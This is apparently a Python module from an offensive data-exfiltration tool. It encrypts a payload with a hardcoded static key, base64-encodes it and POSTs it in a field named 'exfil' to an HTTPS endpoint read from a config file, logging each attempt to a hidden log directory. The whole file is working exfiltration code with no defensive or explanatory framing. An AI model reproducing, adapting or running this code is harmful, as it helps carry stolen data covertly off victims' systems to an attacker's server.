#!/usr/bin/env python3
import os, json, base64, requests
from datetime import datetime
from core.encryptor import encrypt_data

with open("config.json") as f:
    CONFIG = json.load(f)

LOG_PATH = os.path.expanduser("~/exfil/.logs/exfil.log")
os.makedirs(os.path.dirname(LOG_PATH), exist_ok=True)

def log_event(msg):
    with open(LOG_PATH, "a") as f:
        f.write(f"[{datetime.now().isoformat()}] {msg}\n")

def exfil_https(payload_data):
    key = b'12345678901234567890123456789012'  # 32-byte static key for now
    encrypted_blob = encrypt_data(payload_data, key)
    b64_blob = base64.b64encode(encrypted_blob).decode()

    print(f"[debug] Sending base64 blob:\n{b64_blob[:100]}...")
    log_event("Sending encrypted blob over HTTPS")

    try:
        response = requests.post(CONFIG["https_endpoint"], data={"exfil": b64_blob}, timeout=8)
        log_event(f"HTTPS Response: {response.status_code}")
        print(f"[✓] HTTPS exfil successful. Code: {response.status_code}")
    except Exception as e:
        log_event(f"HTTPS exfil failed: {e}")
        print(f"[!] HTTPS exfil failed: {e}")
